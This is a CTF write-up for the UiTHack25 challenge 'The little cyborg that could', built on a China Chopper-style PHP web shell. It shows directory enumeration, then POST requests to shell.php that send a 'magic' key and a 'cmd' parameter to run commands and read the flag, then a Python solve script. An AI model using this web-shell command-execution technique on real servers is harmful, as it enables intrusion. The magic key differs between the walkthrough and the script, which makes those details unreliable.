# The little cyborg that could

>> Pwn - hard
>
> TBD

## Challenge motivation

The challenge is based upon the very famous China Chopper web shell, discussed in the mandiant report [1].
The challenge is designed to test the participants' ability to identify and exploit a web shell hidden within a seemingly innocent PHP website.
However, we had to alter some parts to prevent getting ourselves completely pwned.

## Writeup


## Reconnaissance

Initial observation shows a basic PHP website displaying phpinfo():
```
https://uithack-2.td.org.uit.no:9003
```

2. Looking at the source code doesn't reveal anything immediately suspicious, but the presence of phpinfo() suggests we should look for other PHP files.

3. Basic directory enumeration reveals the existence of shell.php:
```bash
$ gobuster dir -u https://uithack-2.td.org.uit.no:9003 -w /usr/share/wordlists/dirb/common.txt -x php
...
/index.php (Status: 200)
/shell.php (Status: 200)
```

## Discovery and Exploitation

1. Accessing shell.php directly shows a blank page, suggesting it might require specific parameters.

2. Looking at the HTTP POST parameters using Burp Suite or similar tools reveals that the page processes POST requests.

3. Testing common parameter names reveals that the page accepts a "magic" parameter:
```http
POST /shell.php HTTP/1.1
Host: uithack-2.td.org.uit.no:9003
Content-Type: application/x-www-form-urlencoded

magic=test
```

4. After trying common values, we discover the correct magic key is "secret_key_here":
```http
POST /shell.php HTTP/1.1
Host: uithack-2.td.org.uit.no:9003
Content-Type: application/x-www-form-urlencoded

magic=secret_key_here
```

5. Once authenticated with the correct magic key, the shell accepts a "cmd" parameter that allows command execution:
```http
POST /shell.php HTTP/1.1
Host: uithack-2.td.org.uit.no:9003
Content-Type: application/x-www-form-urlencoded

magic=secret_key_here&cmd=ls
```

6. Reading the flag:
```http
POST /shell.php HTTP/1.1
Host: uithack-2.td.org.uit.no:9003
Content-Type: application/x-www-form-urlencoded

magic=secret_key_here&cmd=cat /flag.txt
```

Response:
```
UiTHack25{02_quota_revoked_please_submit_for_disposal}
```

## Python Solution Script
```python
import requests

url = "https://uithack-2.td.org.uit.no:9003/shell.php"
data = {
    "magic": "HYPERION_admin",
    "cmd": "cat /flag.txt"
}

response = requests.post(url, data=data)
print(response.text.strip())
```


### References

[1] <https://www.mandiant.com/sites/default/files/2021-09/rpt-china-chopper.pdf>
[2] <https://www.virustotal.com/gui/file/c4bfc3d39c1d01fa01b2100f1e1c8a58e74a2164fe6fae3c320d23ca3682e058/detection>